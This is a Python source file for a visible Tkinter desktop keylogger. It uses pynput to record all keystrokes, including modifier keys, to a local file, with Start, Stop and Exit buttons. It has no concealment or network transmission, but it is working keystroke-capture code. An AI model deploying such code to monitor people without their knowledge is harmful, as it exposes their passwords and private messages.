import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
from datetime import datetime
import threading
import os

log_file = "serverLog.txt"
logging_active = False
listener = None

def write_log(data):
    with open(log_file, "a") as f:
        f.write(data)

def start_logging():
    global logging_active, listener
    if logging_active:
        messagebox.showinfo("Already Logging", "Keylogger is already running.")
        return

    with open(log_file, "w") as f:
        f.write("Keylogging started at {}\n".format(datetime.now()))

    logging_active = True
    log_status.set("Status: Logging")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

def stop_logging():
    global logging_active, listener
    if listener is not None:
        listener.stop()
        listener = None
    if logging_active:
        write_log("\nLogging stopped at {}\n".format(datetime.now()))
        logging_active = False
        log_status.set("Status: Stopped")
        messagebox.showinfo("Keylogger", "Logging stopped.")

def on_press(key):
    try:
        if key == keyboard.Key.esc:
            stop_logging()
            return False
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            write_log("Alt[")
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            write_log("Ctrl[")
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            write_log("^[")

        elif key == keyboard.Key.enter:
            write_log("\n")
        elif key == keyboard.Key.backspace:
            write_log("(←)")
        elif key == keyboard.Key.space:
            write_log(" ")
        else:
            write_log(str(key.char) if hasattr(key, 'char') and key.char else "[" + str(key) + "]")

    except Exception as e:
        write_log("[Error: {}]".format(e))

def on_release(key):
    try:
        if key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            write_log("]Alt")
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            write_log("]Ctrl")
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            write_log("]^")
    except Exception as e:
        write_log("[Error: {}]".format(e))

# GUI Code
app = tk.Tk()
app.title("Python Keylogger")
app.geometry("300x200")
app.resizable(False, False)

log_status = tk.StringVar()
log_status.set("Status: Not Started")

tk.Label(app, text="Python Keylogger", font=("Helvetica", 16)).pack(pady=10)

tk.Button(app, text="Start Logging", command=lambda: threading.Thread(target=start_logging).start(), width=20, bg="green", fg="white").pack(pady=5)
tk.Button(app, text="Stop Logging", command=stop_logging, width=20, bg="red", fg="white").pack(pady=5)
tk.Button(app, text="Exit", command=lambda: [stop_logging(), app.destroy()], width=20).pack(pady=5)

tk.Label(app, textvariable=log_status, fg="blue").pack(pady=10)

app.mainloop()
